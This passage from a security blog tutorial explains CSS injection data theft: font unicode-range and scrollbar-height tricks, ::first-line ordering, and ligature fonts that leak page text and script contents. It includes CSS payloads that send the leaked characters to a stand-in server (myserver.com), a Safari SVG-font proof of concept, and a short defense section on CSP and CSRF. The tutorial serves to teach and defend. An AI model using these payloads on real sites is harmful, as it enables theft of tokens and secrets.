    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fa"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span><span class="token function">local</span><span class="token punctuation">(</span><span class="token string">'Comic Sans MS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">font-style</span><span class="token punctuation">:</span>monospace<span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+41<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token selector">div</span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> fa<span class="token punctuation">,</span> <span class="token string">"Courier New"</span><span class="token punctuation">;</span>
        <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
        <span class="token property">word-break</span><span class="token punctuation">:</span> break-all<span class="token punctuation">;</span>
        <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
        <span class="token property">overflow-x</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
    Secret: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>DBC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>ABC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>We will see the difference on the screen:</p>
<p><img src="/img/css-injection-2/p2.png" alt="height"></p>
<p>It is obvious that A is higher than the height of other characters, and according to our CSS settings, if the content height exceeds the container height, a scrollbar will appear. Although it is not visible in the screenshot above, the ABC below has a scrollbar, while the DBC above does not.</p>
<p>Moreover, we can actually set an external background for the scrollbar:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div::-webkit-scrollbar</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">div::-webkit-scrollbar:vertical</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>In other words, if the scrollbar appears, our server will receive a request. If the scrollbar does not appear, no request will be received.</p>
<p>Furthermore, when I apply the “fa” font to the div, if there is an “A” on the screen, the scrollbar will appear, and the server will receive a request. If there is no “A” on the screen, nothing will happen.</p>
<p>Therefore, if I keep loading different fonts repeatedly, I can know what characters are on the screen on the server, which is the same as what we can do with <code>unicode-range</code> we learned earlier.</p>
<p>So how do we solve the order problem?</p>
<p>We can first reduce the width of the div to only display one character, so that other characters will be placed on the second line. Then, with the help of the <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/::first-line">::first-line</a> selector, we can adjust the style specifically for the first line, like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fa"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span><span class="token function">local</span><span class="token punctuation">(</span><span class="token string">'Comic Sans MS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">font-style</span><span class="token punctuation">:</span>monospace<span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+41<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token selector">div</span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> fa<span class="token punctuation">,</span> <span class="token string">"Courier New"</span><span class="token punctuation">;</span>
        <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
        <span class="token property">word-break</span><span class="token punctuation">:</span> break-all<span class="token punctuation">;</span>
        <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
        <span class="token property">overflow-x</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token selector">div::first-line</span><span class="token punctuation">&#123;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
    Secret: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>CBAD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>You will only see the character “C” on the screen because we first set the size of all characters to 0 using <code>font-size: 0px</code>, and then use <code>div::first-line</code> to adjust the font-size of the first line to 30px. In other words, only the characters on the first line can be seen, and the current div width is only 20px, so only the first character will appear.</p>
<p>Next, we can use the trick we just learned to load different fonts and see what happens. When I load the “fa” font, because there is no “A” on the screen, nothing will change. But when I load the “fc” font, “C” appears on the screen, so it will be displayed using Comic Sans MS, the height will increase, the scrollbar will appear, and we can use it to send a request, like this:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> fc<span class="token punctuation">,</span> <span class="token string">"Courier New"</span><span class="token punctuation">;</span>
  <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
  <span class="token property">word-break</span><span class="token punctuation">:</span> break-all<span class="token punctuation">;</span>
  <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
  <span class="token property">overflow-x</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
  <span class="token property">--leak</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://myserver.com?C<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">div::first-line</span><span class="token punctuation">&#123;</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">div::-webkit-scrollbar</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">div::-webkit-scrollbar:vertical</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--leak<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>So how do we keep using new font-families? We can use CSS animation to continuously load different font-families and specify different <code>--leak</code> variables.</p>
<p>In this way, we can know what the first character on the screen is.</p>
<p>After knowing the first character, we can make the width of the div longer, for example, to 40px, which can accommodate two characters. Therefore, the first line will be the first two characters, and then we can use the same method to load different font-families to leak out the second character, as follows:</p>
<ol>
<li>Assuming that the screen displays ACB</li>
<li>Adjust the width to 20px, and only the first character A appears on the first line</li>
<li>Load the font “fa”, so A is displayed in a larger font, the scrollbar appears, load the scrollbar background, and send a request to the server</li>
<li>Load the font “fb”, but since B does not appear on the screen, nothing will change.</li>
<li>Load the font “fc”, but since C does not appear on the screen, nothing will change.</li>
<li>Adjust the width to 40px, and the first line displays the first two characters AC</li>
<li>Load the font “fa”, same as step 3</li>
<li>Load the font “fb”, B is displayed in a larger font, the scrollbar appears, and the background is loaded</li>
<li>Load the font “fc”, C is displayed in a larger font, but because the same background has been loaded, no request will be sent</li>
<li>End</li>
</ol>
<p>From the above process, it can be seen that the server will receive three requests in sequence, A, C, B, representing the order of the characters on the screen. Changing the width and font-family continuously can be achieved using CSS animation.</p>
<p>If you want to see the complete demo, you can check out this webpage (source: <a target="_blank" rel="noopener" href="https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/">What can we do with single CSS injection?</a>): <a target="_blank" rel="noopener" href="https://demo.vwzq.net/css2.html">https://demo.vwzq.net/css2.html</a></p>
<p>Although this solution solves the problem of “not knowing the order of characters”, it still cannot solve the problem of duplicate characters, because no request will be sent for duplicate characters.</p>
<h3><span id="ultimate-move-ligature-scrollbar">Ultimate move: ligature + scrollbar</span></h3><p>In short, this trick can solve all the above problems, achieve the goal of “knowing the order of characters and knowing duplicate characters”, and steal the complete text.</p>
<p>Before understanding how to steal, we need to know a proprietary term called ligature. In some fonts, some specific combinations will be rendered as a connected shape, as shown in the figure below (source: <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Ligature_(writing)">wikipedia</a>):</p>
<p><img src="/img/css-injection-2/p3.png" alt="ligature"></p>
<p>So what’s the benefit of this to us?</p>
<p>We can create a unique font ourselves, set <code>ab</code> as a ligature, and render an ultra-wide element. Then, we set the width of a certain div to a fixed value, and combine the scrollbar trick we just learned, which is: “If <code>ab</code> appears, it will become very wide, the scrollbar will appear, and we can load the request to tell the server; if it doesn’t appear, the scrollbar won’t appear, and nothing will happen.”</p>
<p>The process is as follows, assuming there are the three characters <code>acc</code> on the screen:</p>
<ol>
<li>Load the font with the ligature <code>aa</code>, nothing happens.</li>
<li>Load the font with the ligature <code>ab</code>, nothing happens.</li>
<li>Load the font with the ligature <code>ac</code>, successfully render the ultra-wide screen, the scrollbar appears, and load the server image.</li>
<li>The server knows that <code>ac</code> appears on the screen.</li>
<li>Load the font with the ligature <code>aca</code>, nothing happens.</li>
<li>Load the font with the ligature <code>acb</code>, nothing happens.</li>
<li>Load the font with the ligature <code>acc</code>, successfully render, the scrollbar appears, and send the result to the server.</li>
<li>The server knows that <code>acc</code> appears on the screen.</li>
</ol>
<p>Through ligatures combined with the scrollbar, we can leak out all the characters on the screen, even JavaScript code!</p>
<p>Did you know that the contents of a script can be displayed on the screen?</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">head, script</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>Just add this CSS, and the contents of the script will be displayed on the screen. Therefore, we can also use the same technique to steal the contents of the script!</p>
<p>In practice, you can use SVG with other tools to quickly generate fonts on the server side. If you want to see the details and related code, you can refer to this article: <a target="_blank" rel="noopener" href="https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/">Stealing Data in Great style – How to Use CSS to Attack Web Application.</a></p>
<p>Here, I will simply make a demo that is simplified to the extreme to prove that this is feasible. To simplify, someone has made a Safari version of the demo, because Safari supports SVG fonts, so there is no need to generate fonts from the server. The original article is here: <a target="_blank" rel="noopener" href="https://github.com/masatokinugawa/css-exfiltration-svg-font/">Data Exfiltration via CSS + SVG Font - PoC (Safari only)</a></p>
<p>Simple demo:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> secret <span class="token operator">=</span> <span class="token string">"abc123"</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> secret2 <span class="token operator">=</span> <span class="token string">"cba321"</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>defs</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">horiz-adv-x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font-face</span> <span class="token attr-name">font-family</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hack<span class="token punctuation">"</span></span> <span class="token attr-name">units-per-em</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>glyph</span> <span class="token attr-name">unicode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>a<span class="token punctuation">'</span></span> <span class="token attr-name">horiz-adv-x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>99999<span class="token punctuation">"</span></span> <span class="token attr-name">d</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>M1 0z<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>defs</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
    <span class="token selector">script</span> <span class="token punctuation">&#123;</span>
      <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
      <span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"hack"</span><span class="token punctuation">;</span>
      <span class="token property">white-space</span><span class="token punctuation">:</span>n owrap<span class="token punctuation">;</span>
      <span class="token property">overflow-x</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
      <span class="token property">width</span><span class="token punctuation">:</span> 500px<span class="token punctuation">;</span>
      <span class="token property">background</span><span class="token punctuation">:</span>lightblue<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token selector">script::-webkit-scrollbar</span> <span class="token punctuation">&#123;</span>
      <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>I put two pieces of JS in the script, the contents of which are <code>var secret = &quot;abc123&quot;</code> and <code>var secret2 = &quot;cba321&quot;</code>, and then use CSS to load the font I prepared. As long as there is a ligature of <code>&quot;a</code>, the width will become ultra-wide.</p>
<p>Next, if the scrollbar appears, I set the background to blue, which is more conspicuous. The final result is as follows:</p>
<p><img src="/img/css-injection-2/p4.png" alt="scroll"></p>
<p>Above, because the content is <code>var secret = &quot;abc123&quot;</code>, it meets the ligature of <code>&quot;a</code>, so the width becomes wide and the scrollbar appears.</p>
<p>Below, because there is no <code>&quot;a</code>, the scrollbar does not appear (where there is an <code>a</code> will be missing, which should be related to me not defining other glyphs, but it does not affect the result).</p>
<p>Just change the background of the scrollbar to a URL, and you can know the leaked result from the server side.</p>
<p>If you want to see the actual demo and server-side code, you can refer to the two articles attached above.</p>
<h2><span id="defense">Defense</span></h2><p>Finally, let’s talk about defense. The simplest and most straightforward way is to simply seal up the style and not allow its use. Basically, there will be no CSS injection problems (unless there are vulnerabilities in the implementation).</p>
<p>If you really want to open up the style, you can also use CSP to block the loading of some resources, such as not needing to fully open <code>font-src</code>, and <code>style-src</code> can also set an allow list to block the <code>@import</code> syntax.</p>
<p>Next, you can also consider “what will happen if things on the page are taken away”, such as if the CSRF token is taken away, the worst case is CSRF, so you can implement more protection to block CSRF, even if the attacker obtains the CSRF token, they cannot CSRF (such as checking the origin header more).</p>
<h2><span id="summary">Summary</span></h2><p>CSS is really vast and profound. I really admire these predecessors who can play with CSS in so many ways and develop so many eye-opening attack techniques. When I was studying it, I could understand using attribute selectors to leak, and I could understand using <code>unicode-range</code>, but the one that uses text height plus CSS animation to change, I spent a lot of time to figure out what it was doing. Although the concept of ligatures is easy to understand, there are still many problems when it comes to implementation.</p>
<p>Finally, these two articles mainly introduce the CSS injection attack method. Therefore, there is not much actual code, and these attack methods are all referenced from previous articles. The list will be attached below. If you are interested, you can read the original text, which will be more detailed. If you want to delve into any attack, you can also leave a message to communicate with me.</p>
<p>References:</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf">CSS Injection Attacks</a></li>
<li><a target="_blank" rel="noopener" href="https://x-c3ll.github.io/posts/CSS-Injection-Primitives/">CSS Injection Primitives</a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection">HackTricks - CSS Injection</a></li>
<li><a target="_blank" rel="noopener" href="https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/">Stealing Data in Great style – How to Use CSS to Attack Web Application.</a></li>
<li><a target="_blank" rel="noopener" href="https://mksben.l0.cm/2021/11/css-exfiltration-svg-font.html">Data Exfiltration via CSS + SVG Font</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/masatokinugawa/css-exfiltration-svg-font/">Data Exfiltration via CSS + SVG Font - PoC (Safari only)</a></li>
<li><a target="_blank" rel="noopener" href="https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/">CSS data exfiltration in Firefox via a single injection point</a></li>
</ol>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/10/05/en/sekaictf2022-safelist-xsleak/">SekaiCTF 2022 - safelist writeup</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/09/29/en/css-injection-1/">Stealing Data with CSS - CSS Injection (Part 1)</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2024 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/09/29/css-injection-2/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>